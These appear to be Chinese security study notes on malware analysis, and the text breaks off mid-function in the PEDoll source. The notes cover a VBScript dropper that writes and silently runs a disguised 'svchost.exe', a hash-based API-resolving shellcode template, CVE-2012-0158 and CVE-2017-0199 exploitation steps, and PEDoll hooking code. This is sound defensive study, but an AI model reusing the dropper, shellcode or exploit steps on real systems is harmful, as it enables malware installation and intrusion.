<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT Language=VBScript&gt;&lt;!--DropFileName = &quot;svchost.exe&quot;WriteData = &quot;4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010300BC7CB1470000000000000000E0000F010B01070400E000000010000000E0010030C0020000F0010000D002000000400000100000000200000A00000008000100040000000000000000E002000010000000000000020000000000100000100000000010000010000000000000100000000000000000000000E8D402001001000000D00200E80400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000E00100001000000000000000040000000000000000000000000000800000E0555058310000000000E0000000F0010000D2000000040000000000000000000000000000400000E02E727372630000000010000000D002000006000000D60000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303300555058210D09020838ADBE177792F93FD0A0020023D000000048010026000012B29FA89200FF253</span><br><span class="line">Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">DropPath = FSO.GetSpecialFolder(2) &amp; &quot;\&quot; &amp; DropFileName</span><br><span class="line">If FSO.FileExists(DropPath)=False Then</span><br><span class="line">Set FileObj = FSO.CreateTextFile(DropPath, True)</span><br><span class="line">For i = 1 To Len(WriteData) Step 2</span><br><span class="line">FileObj.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(WriteData,i,2)))</span><br><span class="line">Next</span><br><span class="line">FileObj.Close</span><br><span class="line">End If</span><br><span class="line">Set WSHshell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WSHshell.Run DropPath, 0</span><br><span class="line">//--&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>通过十六进制编辑器还原为 exe</p>
<h3 id="基于vbs木马攻击链分析"><a class="markdownIt-Anchor" href="#基于vbs木马攻击链分析">#</a> 基于 VBS 木马攻击链分析</h3>
<p>CreateProcessW &amp;&amp; kernel32!CreateProcessInternalW 下段</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2535bad73dd1462dac4533d552a403e6.png" alt="img"></p>
<ol>
<li>
<p>此次攻击的特点为：在投放木马时伪装成各类软件的安装包，在最终植入的木马运行时又伪装正常软件的进程名，用来下载恶意脚本代码及病毒木马的服务器是攻击者入侵后控制的某些色情和酒店网站服务器，“伪装者 “木马还会使用短链接地址、服务器校验等方法来躲避分析人员的追踪。</p>
<p>在整个攻击过程中使用大量网民熟悉的软件名称来命名木马文件，通过攻击其他网站来下载自己的恶意程序，十分善于隐藏和伪装自身，因此我们将其命名为 “伪装者” 木马。</p>
</li>
</ol>
<h3 id="基于恶意代码的机器学习引擎"><a class="markdownIt-Anchor" href="#基于恶意代码的机器学习引擎">#</a> 基于恶意代码的机器学习引擎</h3>
<ol>
<li>要想检测恶意代码，首先我们必须对其进行特征提取，但是恶意代码的特征向量的维度是非常高的，在计算机中处理起来，计算速度会非常的慢，但是也不必担心，能够检测出恶意代码是否恶意，影响较大的仅仅是几个特征，为此，在进行分类学习之前我们需要对其进行数据预处理，编写这一段代码的作者，采用预先剔除无关影响的特征向量，留下影响较大的特征向量！已达到分类准确的目的，本篇博客是基于机器学习恶意代码检测之数据预处理的第四种处理方法</li>
<li>机器学习是指，概念定义在实例集合上，这个集合表示 X</li>
<li>待学习的概念或目标函数成为目标概念（target concept），记作 c</li>
<li>x：每一个实例</li>
<li>X：样例，所有实例的集合</li>
<li>学习目标：f:X-&gt;Y</li>
<li>简单理解：通过训练大量的样本 x 组成的样本集 X，提取样本中的规则 f，得到一个目标结果 Y</li>
<li><strong>训练集 (training set/data)/ 训练样例 (training examples): 用来进行训练，也就是产生模型或者算法的数据集</strong></li>
<li><strong>测试集 (testing set/data)/ 测试样例 (testing examples): 用来专门进行测试已经学习好的模型或者算法的数据集</strong></li>
<li><strong>特征向量 (features/feature vector): 属性的集合，通常用一个向量表示，附属于一个实例。每一个样例都有自己不同的属性，不同的属性用不同的属性值代表，多个属性值组合在一起就可以用一个向量来表示。这个向量就称之为特征向量。</strong></li>
</ol>
<h2 id="文档类恶意文件"><a class="markdownIt-Anchor" href="#文档类恶意文件">#</a> 文档类恶意文件</h2>
<h3 id="cve-2012-0158"><a class="markdownIt-Anchor" href="#cve-2012-0158">#</a> CVE-2012-0158</h3>
<p>程序将参数传入栈中时没有检查传入的参数是否大于预定的长度，导致栈中关键数据被参数覆盖</p>
<p>CVE-2012-0158 漏<br>
洞发生在 MSCOMCTL.OCX 模块，在一段内存拷贝时，由于检查条件错误造成基于栈的缓冲区溢出。</p>
<p>office 类的程序可以下断在 wineexec 和 CreateProcess</p>
<h3 id="自定义payload中shellcode调试方法"><a class="markdownIt-Anchor" href="#自定义payload中shellcode调试方法">#</a> 自定义 payload 中 shellcode 调试方法</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#define EM(x) _asm _emit x</span><br><span class="line">extern &quot;C&quot; int shellcode_start();</span><br><span class="line"> </span><br><span class="line">_declspec(naked) int shellcode_entry()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        jmp shellcode_start</span><br><span class="line">        nop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//获取Kernel32基地址</span><br><span class="line">_declspec(naked) int GetKernel32Base()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push esi</span><br><span class="line">        mov esi,dword ptr fs : [0x30]//1.FS:[0x30]获取PEB</span><br><span class="line">        mov esi,[esi + 0xc]//2.指向PEB_LDR_DATA结构指针</span><br><span class="line">        mov esi,[esi + 0x1c]//3.模块链表指针</span><br><span class="line">        mov esi,[esi]//4.获取第一个链表结构</span><br><span class="line">        mov esi,[esi]//5.获取模块链表第二个条目，一般是kernel32或者kernelbase(win7以下)</span><br><span class="line">        mov eax,[esi+0x8]//6.获取基址，kernel32或者kernelbase</span><br><span class="line">        pop esi</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//求字符串Hash值</span><br><span class="line">_declspec(naked) int GetStringHash(const char* szString)</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        push esi</span><br><span class="line">        push edx</span><br><span class="line">        xor edx,edx</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov esi,[ebp+8]//获取参数，即字符串</span><br><span class="line">    GetStringHash_Loop:</span><br><span class="line">        lods byte ptr [esi] //获取字符串一个字节</span><br><span class="line">        test al,al</span><br><span class="line">        je GetStringHash_Exit//直到遇到0退出循环</span><br><span class="line">        rol edx,0x3//求hash</span><br><span class="line">        xor dl,al//求hash</span><br><span class="line">        jmp GetStringHash_Loop</span><br><span class="line">    GetStringHash_Exit:</span><br><span class="line">        xchg eax,edx//将结果保存在eax</span><br><span class="line">        pop edx</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn 4</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">_declspec(naked) int GetHashAndCmpHash(const char*strFunName,int nHash)</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        push ebx</span><br><span class="line">        push edx</span><br><span class="line">        mov eax,[ebp+0x8]//参数1：ebp+0x8 strFunName</span><br><span class="line">        push eax</span><br><span class="line">        call GetStringHash</span><br><span class="line">        mov ebx,eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov edx,[ebp+0xc]//参数2 hash</span><br><span class="line">        cmp ebx,edx//比较字符串的hash值</span><br><span class="line">        jne GetHashAndCmpHash_End//不等返回0</span><br><span class="line">        mov eax,0x1//相等返回1</span><br><span class="line">    GetHashAndCmpHash_End:</span><br><span class="line">        pop edx</span><br><span class="line">        pop ebx</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn 8</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//根据hash值 寻找指定模块的 函数地址</span><br><span class="line">_declspec(naked) int GetAddrFromHash(int nHash,int nImageBase)</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0xc//申请局部空间</span><br><span class="line">        push edx</span><br><span class="line">        //1.获取EAT/ENT/EOT地址</span><br><span class="line">        mov edx,[ebp+0xc] //imageBase</span><br><span class="line">        mov esi,[edx+0x3c]//esi=IMAGE_DOS_HEADER.e_lfanew</span><br><span class="line">        lea esi,[edx+esi]//pe文件头</span><br><span class="line">        mov esi,[esi+0x78]//esi=IMAGE_EXPORT.VirtualAddress</span><br><span class="line">        lea esi,[edx+esi]//esi=导出表首地址</span><br><span class="line">        //EAT</span><br><span class="line">        mov edi,[esi+0x1c]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span><br><span class="line">        lea edi,[edx+edi]//EAT首地址</span><br><span class="line">        mov [ebp-0x4],edi//EAT</span><br><span class="line">        //ENT</span><br><span class="line">        mov edi,[esi+0x20]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><br><span class="line">        lea edi,[edx+edi]//ENT首地址</span><br><span class="line">        mov [ebp-0x8],edi//ENT</span><br><span class="line">        //EOT</span><br><span class="line">        mov edi,[esi+0x24]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfNamesOrdinals</span><br><span class="line">        lea edi,[edx+edi]//EOT首地址</span><br><span class="line">        mov [ebp-0xc],edi//EOT</span><br><span class="line">        //2.循环对比ENT中的函数名</span><br><span class="line">        xor ecx,ecx//数组下标</span><br><span class="line">        jmp Loop_FirstCmp</span><br><span class="line">    Loop_FunName:</span><br><span class="line">        inc ecx</span><br><span class="line">    Loop_FirstCmp:</span><br><span class="line">        mov esi, [ebp - 0x8]//ent</span><br><span class="line">        mov esi, [esi + ecx * 4]//ENT rva</span><br><span class="line">        mov edx, [ebp + 0xc]//imageBase</span><br><span class="line">        lea esi, [edx + esi]//ENT va(第一个函数名)</span><br><span class="line">        push[ebp + 0x8]//nHash</span><br><span class="line">        push esi//strFun</span><br><span class="line">        call GetHashAndCmpHash</span><br><span class="line">        test eax, eax</span><br><span class="line">        je Loop_FunName</span><br><span class="line">        //3.成功后找到对应序号</span><br><span class="line">        mov esi, [ebp - 0xc]//EOT</span><br><span class="line">        xor edi, edi</span><br><span class="line">        mov di, [esi + ecx * 2]//取EOT[i]</span><br><span class="line">        //4.在EAT中找到对应函数地址</span><br><span class="line">        mov esi, [ebp - 0x4]//EAT</span><br><span class="line">        mov edi, [esi + edi * 4]//EAT[EOT[i]] rva</span><br><span class="line">        mov edx, [ebp + 0xc]//imageBase</span><br><span class="line">        //5.返回地址</span><br><span class="line">        lea eax, [edx + edi]//EAT VA函数地址</span><br><span class="line">        pop edx</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn 8</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">_declspec(naked) int shellcode_start()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0x30</span><br><span class="line">        jmp zero_code</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        zero_code:</span><br><span class="line"> </span><br><span class="line">        jmp code_start</span><br><span class="line">        //ebp-0x10(28) len:7&quot;user32/0&quot;</span><br><span class="line">        EM(0x75) EM(0x73) EM(0x65) EM(0x72) EM(0x33) EM(0x32) EM(0x00)</span><br><span class="line">        //ebp-0x0c(17) len:12&quot;Hello World/0&quot;</span><br><span class="line">        EM(0x48) EM(0x65) EM(0x6C) EM(0x6C) EM(0x6F) EM(0x20) EM(0x57) EM(0x6F) EM(0x72) EM(0x6C) EM(0x64) EM(0x00)</span><br><span class="line">    code_start:</span><br><span class="line">        call code_pop</span><br><span class="line">    code_pop:</span><br><span class="line">        pop eax</span><br><span class="line">        sub eax,0x18</span><br><span class="line">        mov [ebp-0x2C],eax //保存user32地址</span><br><span class="line">        add eax,0x7</span><br><span class="line">        mov [ebp-0x28],eax//保存Hello World地址</span><br><span class="line"> </span><br><span class="line">        //1.获取Kernel32基地址</span><br><span class="line">        call GetKernel32Base</span><br><span class="line">        mov [ebp-0x24],eax</span><br><span class="line">        //2.获取GetProcAddress地址</span><br><span class="line">        push eax</span><br><span class="line">        push 0xf2509b84</span><br><span class="line">        call GetAddrFromHash</span><br><span class="line">        mov [ebp-0x20],eax</span><br><span class="line">        //3.获取LoadLibraryA地址</span><br><span class="line">        push [ebp-0x24]</span><br><span class="line">        push 0xa412fd89</span><br><span class="line">        call GetAddrFromHash</span><br><span class="line">        mov [ebp-0x1c],eax</span><br><span class="line">        //4.获取user32基地址</span><br><span class="line">        push [ebp-0x2c]</span><br><span class="line">        call [ebp-0x1c]</span><br><span class="line">        mov [ebp-0x18],eax</span><br><span class="line">        //5.获取MessageBoxA地址</span><br><span class="line">        push eax</span><br><span class="line">        push 0x14d14c51</span><br><span class="line">        call GetAddrFromHash</span><br><span class="line">        mov [ebp-0x14],eax</span><br><span class="line">        //6.调用MessageBoxA地址</span><br><span class="line">        push 0</span><br><span class="line">        push 0</span><br><span class="line">        push [ebp-0x28]</span><br><span class="line">        push 0</span><br><span class="line">        call [ebp-0x14]</span><br><span class="line">        //7.获取ExitProcess地址</span><br><span class="line">        push [ebp-0x24]</span><br><span class="line">        push 0xe6ff2cb9</span><br><span class="line">        call GetAddrFromHash</span><br><span class="line">        //8.调用ExitProcess</span><br><span class="line">        push 0</span><br><span class="line">        call eax</span><br><span class="line"> </span><br><span class="line">        retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    shellcode_entry();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="cve-2017-0199"><a class="markdownIt-Anchor" href="#cve-2017-0199">#</a> CVE-2017-0199</h3>
<p>word 在处理内嵌 OLE2LINK 对象时，通过网络更新对象时没有正确处理的 Content-Type 所导致的逻辑漏洞。</p>
<p>根据微软官方 MS15-33 安全公告里显示，这个漏洞覆盖 2007 SP3，2010 SP1、SP2，2013，2013 RT；Word Viewer；Office Compatibility Pack SP3；Office for Mac 2011；Word Automation Services on SharePoint Server 2010 SP1、SP2、2013；Office Web Apps 2010 SP1 and SP2；Office Web Apps Server 2013。</p>
<p><strong>漏洞利用</strong></p>
<ol>
<li>word 在处理内嵌 OLE2LINK 对象时，对多媒体对象的类型没有检查。服务端返回一个 hta 类型数据被 WORD 调用 COM 接口创建 mshta.exe 直接运行。</li>
<li>由于该漏洞是 word 逻辑漏洞，利用起来相对容易，通过在文档中点击插入对象，设置对象地址，然后选择 “链接到文件”，点击确认，这样便可以插入一个 OLE 对象。</li>
<li>然后把服务端的 “test.rtf” 文件内容修改为一个 html 脚本文件。</li>
<li>并且修改服务端 mime 类型，原本 “.rtf” 的 Mime 类型为 “application/rtf”，修改为 “application/rtf hta”。</li>
<li>此时点击文档中的 ole 对象，就能运行服务器中的脚本文件。接着在编辑文档中的”objlink” 对象，增加属性”\objupdate”，就能够让文档打开时直接触发利用 (虚拟机中很多都触发不了，2013、2016 触发比较稳定)。<br>
<strong>四、</strong>     <strong>漏洞成因</strong></li>
<li>Word 把远端数据下载到临时文件夹中，http 协议中的”content/type” 数据如下。</li>
<li>然后通过 Urlmon 模块中的 “GetClassFileOrMimeinternal” 函数获取运行该文件的 com 组件 CLSID。</li>
<li>“GetClassFileOrMimeinternal” 会优先通过”content/type” 获取 CLSID, 如果获取失败才会通过后缀名获取 CLSID。</li>
<li>此时获取到的 CLSID 为 “3050f4d8-98b5-11cf-bb82-00aa00bdce0b”，然后调用 “CoCreateInstanceForObjectBinding” 创建一个 COM 实例，该 COM 对象就是 “mshta.exe” 程序，最后传递数据，直接 html 脚本。</li>
<li>该漏洞的成因和利用相对简单，只需要几个操作就可以形成一个利用。最后在看一下微软修改补丁：</li>
<li>在 “CoCreateInstanceForObjectBinding” 创建了一个 “FilterActivation” 函数，增加了一个 “g_ActivationFilter” 对象，在该函数中调用 “g_ActivationFilter” 虚表 + 12 位置的虚函数，把 CLSID 作为参数。</li>
<li>找到 “g_ActivationFilter” 的初始化位置，该函数由 MSO 模块调用。</li>
<li>​      MSO 模块初始化该过滤对象，该对象是一个全局对象，找到该对象的虚表，如下图。</li>
<li>在虚表中 + 12 位置的虚函数伪代码如下，在前面调用中，第三个参数是 CLSID，说明下面两次比较应该是检查 CLSID。</li>
<li>这两个 CLSID 经过分析后，发现为脚本对象和 hta 对象的 ID。微软通过检查 CLSID，过滤脚本对象和 HTA 对象，目前只有这两个对象，如果以后发现有新的威胁，也方便以后扩展</li>
</ol>
<h2 id="pe类恶意程序分析"><a class="markdownIt-Anchor" href="#pe类恶意程序分析">#</a> PE 类恶意程序分析</h2>
<h3 id="pedoll"><a class="markdownIt-Anchor" href="#pedoll">#</a> PEDoll</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002132806855.png" alt="image-20231002132806855"></p>
<p>调试机运行，控制器连接</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002132844541.png" alt="image-20231002132844541"></p>
<p>常用脚本中为规则中加载的脚本</p>
<p>PeDoll 是一款基于 inline Hook 的程序行为分析软件，主要包括以下功能<br>
 1. 对关键 API 调用进行 Hook 生成报表，监视程序行为<br>
 2. 运行时修改程序执行代码<br>
 3. 程序的网络抓包，写入数据的 Dump<br>
4. 软件实现的自旋锁断点，方便与 OllyDbg 联合调试<br>
 5. 分析目标程序的内存，分析栈数据实现破解.<br>
PeDoll 主要面向逆向分析初学者或者是具有一定编程逆向基础的 Cracker, 旨在简化逆向分析工作，可以在一定程度上对一些具有反逆向功能的恶意程序 (加壳，加花，反调试器) 简化分析难度或实现自动化分析<br>
 PeDoll 是基于简单脚本 (命令) 控制的行为分析软件，通过对不同的程序编写不同的脚本实现特定的分析，同时 PeDoll 是一款远程分析调试器，这也意味着在对恶意程序分析中控制端和调试端分开进行是被建议的</p>
<p>其运行原理如下所示<br>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/cd7110364ceb4c23ba9411c5a0320104.png" alt="img"></p>
<p>命令：doll db &lt;D:\Sample1.exe&gt;</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002134450857.png" alt="image-20231002134450857"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002135648446.png" alt="image-20231002135648446"></p>
<p>会更改函数头前五个字节</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002135943900.png" alt="image-20231002135943900"></p>
<p>会在 exe 中加载自己的 dll</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003174400974.png" alt="image-20231003174400974"></p>
<h3 id="pedoll-源码分析"><a class="markdownIt-Anchor" href="#pedoll-源码分析">#</a> PEDoll 源码分析</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hdHJpeGNhc2NhZGUvUGVEb2xs">https://github.com/matrixcascade/PeDoll</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">int APIENTRY hook_WriteProcessMemory( __in HANDLE hProcess, __in LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten )</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwesp;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov dwesp,esp</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sprintf(HookMessage, &quot;%s &lt;%08X&gt; &lt;%08X&gt; &lt;%08X&gt; &lt;%d&gt;&quot;,PEDOLL_QUERY_WRITEPROCESSMEMORY,(DWORD)hProcess,(int)lpBaseAddress,(int)lpBuffer,nSize);</span><br><span class="line"></span><br><span class="line">	int reply=MonitorQuery(HookMessage,dwesp);</span><br><span class="line">	if (reply == PEDOLL_EXECUTE_PASS)</span><br><span class="line">	&#123;</span><br><span class="line">		WriteProcessMemoryHooker.Unhook();</span><br><span class="line">		int st = WriteProcessMemory(hProcess, lpBaseAddress, 